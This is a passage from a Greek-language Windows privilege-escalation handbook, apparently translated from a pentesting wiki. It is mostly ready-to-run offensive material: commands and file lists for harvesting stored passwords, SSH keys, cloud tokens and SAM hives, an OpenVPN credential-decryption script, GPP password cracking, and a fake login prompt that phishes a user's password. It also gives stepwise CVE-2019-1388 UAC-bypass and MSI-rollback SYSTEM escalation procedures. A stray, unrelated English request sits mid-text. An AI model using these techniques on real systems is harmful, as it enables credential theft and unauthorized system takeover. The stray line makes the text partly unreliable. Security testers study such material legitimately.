}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Ελέγξτε αν υπάρχει το `C:\Windows\CCM\SCClient.exe` .\
Τα installers **εκτελούνται με δικαιώματα SYSTEM**, πολλοί είναι ευάλωτοι σε **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Αρχεία και Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Κλειδιά Host του Putty SSH
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Κλειδιά SSH στο registry

Τα ιδιωτικά κλειδιά SSH μπορούν να αποθηκευτούν μέσα στο registry key `HKCU\Software\OpenSSH\Agent\Keys`, οπότε θα πρέπει να ελέγξεις αν υπάρχει κάτι ενδιαφέρον εκεί:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Αν βρείτε οποιαδήποτε καταχώρηση μέσα σε αυτό το path, πιθανότατα θα είναι ένα αποθηκευμένο SSH key. Αποθηκεύεται κρυπτογραφημένο αλλά μπορεί εύκολα να αποκρυπτογραφηθεί χρησιμοποιώντας [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες για αυτήν την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Αν η υπηρεσία `ssh-agent` δεν εκτελείται και θέλετε να ξεκινά αυτόματα στο boot, εκτελέστε:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Φαίνεται ότι αυτή η τεχνική δεν είναι πλέον έγκυρη. Προσπάθησα να δημιουργήσω κάποια ssh keys, να τα προσθέσω με `ssh-add` και να κάνω login via ssh σε ένα μηχάνημα. Το registry HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε τη χρήση του `dpapi.dll` κατά το asymmetric key authentication.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας **metasploit**: _post/windows/gather/enum_unattend_

Example content:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Αντίγραφα ασφαλείας SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Διαπιστευτήρια Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Αναζήτησε ένα αρχείο με όνομα **SiteList.xml**

### Cached GPP Pasword

Προηγουμένως ήταν διαθέσιμη μια λειτουργία που επέτρεπε την ανάπτυξη προσαρμοσμένων local administrator accounts σε μια ομάδα μηχανών μέσω Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά security flaws. Πρώτον, τα Group Policy Objects (GPOs), αποθηκευμένα ως XML αρχεία στο SYSVOL, μπορούσαν να προσπελαστούν από οποιονδήποτε domain user. Δεύτερον, τα passwords μέσα σε αυτά τα GPPs, κρυπτογραφημένα με AES256 χρησιμοποιώντας ένα publicly documented default key, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε authenticated user. Αυτό αποτελούσε σοβαρό κίνδυνο, καθώς θα μπορούσε να επιτρέψει σε users να αποκτήσουν elevated privileges.

Για τον μετριασμό αυτού του κινδύνου, αναπτύχθηκε μια function για να σαρώνει locally cached GPP files που περιέχουν ένα πεδίο "cpassword" που δεν είναι κενό. Μόλις βρεθεί ένα τέτοιο αρχείο, η function αποκρυπτογραφεί το password και επιστρέφει ένα custom PowerShell object. Αυτό το object περιλαμβάνει λεπτομέρειες σχετικά με το GPP και τη θέση του αρχείου, βοηθώντας στην αναγνώριση και αποκατάσταση αυτής της security vulnerability.

Αναζήτησε στο `C:\ProgramData\Microsoft\Group Policy\history` ή στο _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ αυτά τα αρχεία:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Για να αποκρυπτογραφήσεις το cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Χρησιμοποιώντας το crackmapexec για να αποκτήσετε τους κωδικούς πρόσβασης:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Παράδειγμα web.config με διαπιστευτήρια:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Διαπιστευτήρια OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ζητήστε credentials

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισαγάγει τα credentials του ή ακόμα και τα credentials ενός διαφορετικού χρήστη** αν πιστεύετε ότι μπορεί να τα γνωρίζει (προσέξτε ότι το να **ζητάτε** απευθείας από τον πελάτη τα **credentials** είναι πραγματικά **επικίνδυνο**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Πιθανά ονόματα αρχείων που περιέχουν credentials**

Γνωστά αρχεία που κάποτε περιείχαν **passwords** σε **clear-text** ή **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Please provide the files or content you want me to search through.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Διαπιστευτήρια στο RecycleBin

Θα πρέπει επίσης να ελέγξεις το Bin για να αναζητήσεις διαπιστευτήρια μέσα σε αυτό

Για να **ανακτήσεις passwords** που έχουν αποθηκευτεί από διάφορα προγράμματα μπορείς να χρησιμοποιήσεις: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Μέσα στο registry

**Άλλα πιθανά registry keys με διαπιστευτήρια**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Εξαγωγή openssh keys από το registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό Browsers

Θα πρέπει να ελέγξεις για dbs όπου αποθηκεύονται passwords από **Chrome ή Firefox**.\
Επίσης έλεγξε το history, τα bookmarks και τα favourites των browsers ώστε ίσως κάποια **passwords** να είναι αποθηκευμένα εκεί.

Tools για εξαγωγή passwords από browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Το **Component Object Model (COM)** είναι μια τεχνολογία ενσωματωμένη στο Windows operating system που επιτρέπει **intercommunication** μεταξύ software components διαφορετικών γλωσσών. Κάθε COM component αναγνωρίζεται μέσω ενός class ID (**CLSID**) και κάθε component εκθέτει λειτουργικότητα μέσω ενός ή περισσότερων interfaces, που αναγνωρίζονται μέσω interface IDs (**IIDs**).

Τα COM classes και interfaces ορίζονται στο registry κάτω από **HKEY\CLASSES\ROOT\CLSID** και **HKEY\CLASSES\ROOT\Interface** αντίστοιχα. Αυτό το registry δημιουργείται με συγχώνευση των **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSIDs αυτού του registry μπορείς να βρεις το child registry **InProcServer32** το οποίο περιέχει μια **default value** που δείχνει σε ένα **DLL** και μια τιμή με όνομα **ThreadingModel** που μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ή **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Βασικά, αν μπορείς να **overwrite οποιοδήποτε από τα DLLs** που πρόκειται να εκτελεστούν, θα μπορούσες να **escalate privileges** αν αυτό το DLL πρόκειται να εκτελεστεί από διαφορετικό χρήστη.

Για να μάθεις πώς οι attackers χρησιμοποιούν το COM Hijacking ως μηχανισμό persistence, έλεγξε:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Αναζήτηση περιεχομένου αρχείων**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Αναζήτηση για αρχείο με συγκεκριμένο όνομα**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Αναζήτησε στο registry για ονόματα κλειδιών και passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Εργαλεία που αναζητούν passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin Έχω δημιουργήσει αυτό το plugin για να **εκτελεί αυτόματα κάθε metasploit POST module που αναζητά credentials** μέσα στο θύμα.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν passwords που αναφέρονται σε αυτή τη σελίδα.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **sessions**, **usernames** και **passwords** διαφόρων εργαλείων που αποθηκεύουν αυτά τα δεδομένα σε καθαρό κείμενο (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Φαντάσου ότι **μια διεργασία που τρέχει ως SYSTEM ανοίγει μια νέα διεργασία** (`OpenProcess()`) **με πλήρη πρόσβαση**. Η ίδια διεργασία **επίσης δημιουργεί μια νέα διεργασία** (`CreateProcess()`) **με χαμηλά privileges αλλά κληρονομώντας όλα τα open handles της κύριας διεργασίας**.\
Τότε, αν έχεις **πλήρη πρόσβαση στη χαμηλού privilege διεργασία**, μπορείς να αρπάξεις το **open handle προς την privileged διεργασία που δημιουργήθηκε** με `OpenProcess()` και να **inject a shellcode**.\
[Διάβασε αυτό το παράδειγμα για περισσότερες πληροφορίες σχετικά με το **πώς να εντοπίσεις και να εκμεταλλευτείς αυτή την ευπάθεια**.](leaked-handle-exploitation.md)\
[Διάβασε αυτό το **άλλο post για μια πιο ολοκληρωμένη εξήγηση σχετικά με το πώς να ελέγξεις και να abuse περισσότερα open handlers διεργασιών και νημάτων που κληρονομούνται με διαφορετικά επίπεδα permissions (όχι μόνο full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Τα shared memory segments, που αναφέρονται ως **pipes**, επιτρέπουν επικοινωνία διεργασιών και μεταφορά δεδομένων.

Τα Windows παρέχουν μια δυνατότητα που ονομάζεται **Named Pipes**, επιτρέποντας σε ασύνδετες διεργασίες να μοιράζονται δεδομένα, ακόμη και σε διαφορετικά δίκτυα. Αυτό μοιάζει με αρχιτεκτονική client/server, με ρόλους που ορίζονται ως **named pipe server** και **named pipe client**.

Όταν δεδομένα στέλνονται μέσω ενός pipe από έναν **client**, ο **server** που έστησε το pipe έχει τη δυνατότητα να **αναλάβει την ταυτότητα** του **client**, εφόσον διαθέτει τα απαραίτητα δικαιώματα **SeImpersonate**. Ο εντοπισμός μιας **privileged process** που επικοινωνεί μέσω ενός pipe που μπορείς να μιμηθείς παρέχει την ευκαιρία να **αποκτήσεις υψηλότερα privileges** υιοθετώντας την ταυτότητα αυτής της διεργασίας μόλις αλληλεπιδράσει με το pipe που έστησες. Για οδηγίες εκτέλεσης μιας τέτοιας επίθεσης, χρήσιμοι οδηγοί υπάρχουν [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](#from-high-integrity-to-system).

Επίσης το ακόλουθο tool επιτρέπει να **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Η Telephony service (TapiSrv) σε server mode εκθέτει το `\\pipe\\tapsrv` (MS-TRP). Ένας απομακρυσμένος authenticated client μπορεί να abuse the mailslot-based async event path για να μετατρέψει το `ClientAttach` σε ένα αυθαίρετο **4-byte write** σε οποιοδήποτε υπάρχον αρχείο που είναι writable by `NETWORK SERVICE`, και μετά να αποκτήσει Telephony admin rights και να φορτώσει ένα αυθαίρετο DLL ως service. Πλήρης ροή:

- `ClientAttach` με `pszDomainUser` ορισμένο σε ένα writable existing path → η υπηρεσία το ανοίγει μέσω `CreateFileW(..., OPEN_EXISTING)` και το χρησιμοποιεί για async event writes.
- Κάθε event γράφει το attacker-controlled `InitContext` από το `Initialize` σε εκείνο το handle. Καταχώρησε ένα line app με `LRegisterRequestRecipient` (`Req_Func 61`), ενεργοποίησε το `TRequestMakeCall` (`Req_Func 121`), κάνε fetch μέσω `GetAsyncEvents` (`Req_Func 0`), και μετά κάνε unregister/shutdown για να επαναλάβεις deterministic writes.
- Πρόσθεσε τον εαυτό σου στο `[TapiAdministrators]` στο `C:\Windows\TAPI\tsec.ini`, reconnect, και μετά κάλεσε το `GetUIDllName` με ένα arbitrary DLL path για να εκτελέσεις το `TSPI_providerUIIdentify` ως `NETWORK SERVICE`.

Περισσότερες λεπτομέρειες:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Δες τη σελίδα **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Τα clickable Markdown links που προωθούνται στο `ShellExecuteExW` μπορούν να ενεργοποιήσουν επικίνδυνους URI handlers (`file:`, `ms-appinstaller:` ή οποιοδήποτε registered scheme) και να εκτελέσουν attacker-controlled files ως τον τρέχοντα χρήστη. Δες:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Όταν αποκτάς shell ως χρήστης, μπορεί να υπάρχουν scheduled tasks ή άλλες διεργασίες που εκτελούνται και **περνούν credentials στη command line**. Το παρακάτω script καταγράφει command lines διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας τυχόν διαφορές.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Κλοπή κωδικών πρόσβασης από διεργασίες

## Από Low Priv User σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Αν έχεις πρόσβαση στο γραφικό περιβάλλον (μέσω console ή RDP) και το UAC είναι ενεργό, σε ορισμένες εκδόσεις του Microsoft Windows είναι δυνατό να εκτελέσεις ένα terminal ή οποιαδήποτε άλλη διεργασία όπως "NT\AUTHORITY SYSTEM" από έναν μη προνομιούχο χρήστη.

Αυτό καθιστά δυνατό το privilege escalation και το UAC bypass ταυτόχρονα με το ίδιο vulnerability. Επιπλέον, δεν χρειάζεται να εγκαταστήσεις τίποτα και το binary που χρησιμοποιείται κατά τη διάρκεια της διαδικασίας είναι signed και issued by Microsoft.

Μερικά από τα επηρεαζόμενα συστήματα είναι τα ακόλουθα:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Για να εκμεταλλευτείτε αυτή την ευπάθεια, είναι απαραίτητο να εκτελέσετε τα ακόλουθα βήματα:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Από Administrator Medium σε High Integrity Level / UAC Bypass

Διάβασε αυτό για να **μάθεις για Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Έπειτα **διάβασε αυτό για να μάθεις για UAC και UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Από Arbitrary Folder Delete/Move/Rename σε SYSTEM EoP

Η τεχνική που περιγράφεται [**σε αυτό το blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) με exploit code [**διαθέσιμο εδώ**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Η επίθεση βασικά συνίσταται στο να γίνεται abuse της δυνατότητας rollback του Windows Installer για να αντικαθίστανται νόμιμα αρχεία με κακόβουλα κατά τη διάρκεια της διαδικασίας απεγκατάστασης. Για αυτό ο attacker χρειάζεται να δημιουργήσει ένα **malicious MSI installer** που θα χρησιμοποιηθεί για hijack του φακέλου `C:\Config.Msi`, ο οποίος στη συνέχεια θα χρησιμοποιηθεί από το Windows Installer για να αποθηκεύσει rollback files κατά την απεγκατάσταση άλλων πακέτων MSI, όπου τα rollback files θα έχουν τροποποιηθεί ώστε να περιέχουν το κακόβουλο payload.

Η συνοπτική τεχνική είναι η εξής:

1. **Stage 1 – Προετοιμασία για το Hijack (άφησε το `C:\Config.Msi` άδειο)**

- Βήμα 1: Εγκατάσταση του MSI
- Δημιούργησε ένα `.msi` που εγκαθιστά ένα ακίνδυνο αρχείο (π.χ. `dummy.txt`) σε έναν writable φάκελο (`TARGETDIR`).
- Σήμανε τον installer ως **"UAC Compliant"**, ώστε ένας **non-admin user** να μπορεί να τον εκτελέσει.
- Κράτα ένα ανοιχτό **handle** στο αρχείο μετά την εγκατάσταση.

- Βήμα 2: Ξεκίνα Uninstall
- Κάνε uninstall το ίδιο `.msi`.
- Η διαδικασία uninstall αρχίζει να μετακινεί αρχεία στο `C:\Config.Msi` και να τα μετονομάζει σε `.rbf` files (rollback backups).
- **Poll το ανοιχτό file handle** με `GetFinalPathNameByHandle` για να εντοπίσεις πότε το αρχείο γίνεται `C:\Config.Msi\<random>.rbf`.

- Βήμα 3: Custom Syncing
- Το `.msi` περιλαμβάνει ένα **custom uninstall action (`SyncOnRbfWritten`)** που:
- Σηματοδοτεί όταν το `.rbf` έχει γραφτεί.
- Έπειτα **περιμένει** σε ένα άλλο event πριν συνεχίσει το uninstall.

- Βήμα 4: Αποτροπή Διαγραφής του `.rbf`
- Όταν δοθεί το σήμα, **άνοιξε το `.rbf` file** χωρίς `FILE_SHARE_DELETE` — αυτό **αποτρέπει τη διαγραφή** του.
- Έπειτα **στείλε σήμα πίσω** ώστε το uninstall να μπορέσει να ολοκληρωθεί.
- Το Windows Installer αποτυγχάνει να διαγράψει το `.rbf`, και επειδή δεν μπορεί να διαγράψει όλο το περιεχόμενο, το **`C:\Config.Msi` δεν αφαιρείται**.

- Βήμα 5: Χειροκίνητη Διαγραφή του `.rbf`
- Εσύ (attacker) διαγράφεις χειροκίνητα το `.rbf` file.
- Τώρα το **`C:\Config.Msi` είναι άδειο**, έτοιμο για hijack.

> Σε αυτό το σημείο, **ενεργοποίησε το SYSTEM-level arbitrary folder delete vulnerability** για να διαγράψεις το `C:\Config.Msi`.

2. **Stage 2 – Αντικατάσταση Rollback Scripts με Κακόβουλα**

- Βήμα 6: Αναδημιουργία του `C:\Config.Msi` με Weak ACLs
- Αναδημιούργησε μόνος σου τον φάκελο `C:\Config.Msi`.
- Όρισε **weak DACLs** (π.χ., Everyone:F) και **κράτα ένα handle ανοιχτό** με `WRITE_DAC`.

- Βήμα 7: Εκτέλεση Άλλης Εγκατάστασης
- Εγκατάστησε ξανά το `.msi`, με:
- `TARGETDIR`: Writable τοποθεσία.
- `ERROROUT`: Μια μεταβλητή που ενεργοποιεί forced failure.
- Αυτή η εγκατάσταση θα χρησιμοποιηθεί για να ενεργοποιήσει ξανά το **rollback**, το οποίο διαβάζει `.rbs` και `.rbf`.

- Βήμα 8: Παρακολούθηση για `.rbs`
- Χρησιμοποίησε `ReadDirectoryChangesW` για να παρακολουθείς το `C:\Config.Msi` μέχρι να εμφανιστεί ένα νέο `.rbs`.
- Κατέγραψε το filename του.

- Βήμα 9: Sync Πριν από το Rollback
- Το `.msi` περιέχει ένα **custom install action (`SyncBeforeRollback`)** που:
- Σηματοδοτεί ένα event όταν δημιουργείται το `.rbs`.
- Έπειτα **περιμένει** πριν συνεχίσει.

- Βήμα 10: Επαναφορά Weak ACL
- Μετά τη λήψη του event `rbs created`:
- Το Windows Installer **επαναφέρει ισχυρά ACLs** στο `C:\Config.Msi`.
- Αλλά επειδή εξακολουθείς να έχεις handle με `WRITE_DAC`, μπορείς να **επαναφέρεις ξανά weak ACLs**.

> Τα ACLs **εφαρμόζονται μόνο στο handle open**, άρα μπορείς ακόμα να γράψεις στον φάκελο.

- Βήμα 11: Ρίξε Fake `.rbs` και `.rbf`
- Αντικατάστησε το `.rbs` file με ένα **fake rollback script** που λέει στα Windows να:
- Επαναφέρει το `.rbf` file σου (malicious DLL) σε μια **privileged location** (π.χ., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Ρίξε το fake `.rbf` σου που περιέχει ένα **malicious SYSTEM-level payload DLL**.

- Βήμα 12: Ενεργοποίηση του Rollback
- Στείλε σήμα στο sync event ώστε ο installer να συνεχίσει.
- Ένα **type 19 custom action (`ErrorOut`)** έχει ρυθμιστεί ώστε να **αποτυγχάνει σκόπιμα** την εγκατάσταση σε ένα γνωστό σημείο.
- Αυτό προκαλεί την έναρξη του **rollback**.

- Βήμα 13: Το SYSTEM Εγκαθιστά το DLL σου
- Το Windows Installer:
- Διαβάζει το κακόβουλο `.rbs` σου.
- Αντιγράφει το `.rbf` DLL σου στην τελική τοποθεσία.
- Τώρα έχεις το **κακόβουλο DLL σου σε SYSTEM-loaded path**.

- Τελικό Βήμα: Εκτέλεση SYSTEM Code
- Τρέξε ένα trusted **auto-elevated binary** (π.χ., `osk.exe`) που φορτώνει το DLL που hijacked.
- **Boom**: Ο κώδικάς σου εκτελείται **ως SYSTEM**.


### Από Arbitrary File Delete/Move/Rename σε SYSTEM EoP

